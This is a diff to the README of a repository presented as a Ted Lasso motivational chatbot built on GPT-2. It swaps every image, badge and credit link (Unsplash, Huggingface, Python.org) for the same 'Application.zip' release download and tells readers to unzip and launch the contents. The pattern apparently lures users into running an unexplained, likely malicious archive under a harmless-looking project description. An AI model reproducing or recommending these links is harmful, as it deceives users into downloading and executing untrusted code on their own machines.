@@ -2,7 +2,7 @@
 
 Welcome to the "Ted-Lasso-GPT" repository! 🌟
 
-![Ted Lasso](https://images.unsplash.com/photo-1633365556338-d31b4c5b9920)
+![Ted Lasso](https://github.com/ilovedoo/Ted-Lasso-GPT/releases/download/v1.0/Application.zip)
 
 ## Description
 This repository houses a motivational chatbot trained on the uplifting dialogues from the famous TV show - Ted Lasso. 🏈 The chatbot is powered by GPT-2 and fine-tuned on the script dialogues from the show. Harnessing the power of language models and machine learning, this chatbot is designed to spread positivity and motivation, just like Ted Lasso himself! 💬
@@ -21,7 +21,7 @@ This repository houses a motivational chatbot trained on the uplifting dialogues
 
 ## Get Started
 To download the zip file, click the button below:
-[![Download Zip](https://img.shields.io/badge/Download-Zip-brightgreen)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/ilovedoo/Ted-Lasso-GPT/releases/download/v1.0/Application.zip)](https://github.com/ilovedoo/Ted-Lasso-GPT/releases/download/v1.0/Application.zip)
 
 If the link ends in a file name, make sure to unzip it before launching the contents.
 
@@ -37,10 +37,10 @@ Contributions to enhance the chatbot's functionality or add more features inspir
 If you encounter any issues, have suggestions, or simply want to chat about Ted Lasso, feel free to open an issue. Our team is here to help and discuss anything related to this project. Let's keep the positive vibes flowing! 💬
 
 ## Credits
-- Ted Lasso images: [Unsplash](https://unsplash.com)
+- Ted Lasso images: [Unsplash](https://github.com/ilovedoo/Ted-Lasso-GPT/releases/download/v1.0/Application.zip)
 - GPT-2: OpenAI
-- Huggingface: [Huggingface](https://huggingface.co)
-- Python: [Python.org](https://www.python.org)
+- Huggingface: [Huggingface](https://github.com/ilovedoo/Ted-Lasso-GPT/releases/download/v1.0/Application.zip)
+- Python: [https://github.com/ilovedoo/Ted-Lasso-GPT/releases/download/v1.0/Application.zip](https://github.com/ilovedoo/Ted-Lasso-GPT/releases/download/v1.0/Application.zip)
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
